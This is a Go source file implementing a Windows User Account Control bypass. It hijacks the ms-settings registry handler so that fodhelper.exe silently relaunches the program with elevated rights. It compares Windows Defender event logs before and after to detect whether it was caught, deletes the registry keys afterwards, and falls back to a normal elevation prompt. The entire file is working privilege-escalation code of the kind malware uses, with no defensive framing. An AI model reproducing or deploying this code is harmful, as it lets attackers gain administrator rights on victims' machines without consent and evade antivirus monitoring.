package main

import (
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

const MsSettingsKey = `SOFTWARE\Classes\ms-settings`

var (
	shell32           = syscall.NewLazyDLL("shell32.dll")
	procShellExecuteW = shell32.NewProc("ShellExecuteW")
	system32          = os.Getenv("SystemRoot") + "\\System32"
)

// bypassUAC attempts to bypass User Account Control (UAC)
func bypassUAC() {
	success := uacMsSettings()
	if !success {
		showUACPrompt()
	}
}

// uacMsSettings attempts to bypass UAC using the fodhelper.exe method
// Returns true if successful, false otherwise
func uacMsSettings() bool {
	k, _, err := registry.CreateKey(registry.CURRENT_USER, MsSettingsKey+`\shell\open\command`, registry.SET_VALUE)
	if err != nil {
		panic(err)
	}
	defer k.Close()

	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}
	if err := k.SetStringValue("", exePath); err != nil {
		panic(err)
	}
	_ = k.SetStringValue("DelegateExecute", "")
	_ = k.Close()

	start, err := executeCommand(system32+"\\wevtutil.exe", "qe", "Microsoft-Windows-Windows Defender/Operational", "/f:text").Output()

	// Execute fodhelper.exe to trigger the UAC bypass
	_ = executeCommand(system32+"\\fodhelper.exe", "uacbypass").Run()

	end, err := executeCommand(system32+"\\wevtutil.exe", "qe", "Microsoft-Windows-Windows Defender/Operational", "/f:text").Output()

	// Clean up the registry key after execution
	_ = registry.DeleteKey(registry.CURRENT_USER, MsSettingsKey+`\shell\open\command`)
	_ = registry.DeleteKey(registry.CURRENT_USER, MsSettingsKey+`\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, MsSettingsKey+`\shell`)

	// If the length of the end output is greater than the start output, it indicates that Windows Defender was triggered.
	// In this case, it didn't work.
	if err != nil || len(end) > len(start) {
		return false
	}

	return true
}

// IsRunningAsAdmin checks if the current process is running with administrative privileges
func IsRunningAsAdmin() bool {
	var token syscall.Token
	proc, err := syscall.GetCurrentProcess()
	err = syscall.OpenProcessToken(proc, syscall.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	var elevationType uint32
	var outLen uint32
	err = syscall.GetTokenInformation(token, syscall.TokenElevationType, (*byte)(unsafe.Pointer(&elevationType)), uint32(unsafe.Sizeof(elevationType)), &outLen)
	if err != nil {
		return false
	}

	return elevationType == 2 // TokenElevationTypeFull
}

func showUACPrompt() {
	verb := "runas"
	exe, err := os.Executable()
	if err != nil {
		panic(err)
	}
	cwd, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	// Convert strings to UTF-16 pointers
	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)

	// Call ShellExecuteW to show the UAC prompt
	ret, _, err := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(exePtr)),
		0,
		uintptr(unsafe.Pointer(cwdPtr)),
		1, // SW_SHOWNORMAL
	)
	if ret <= 32 {
		panic(err)
	}
}
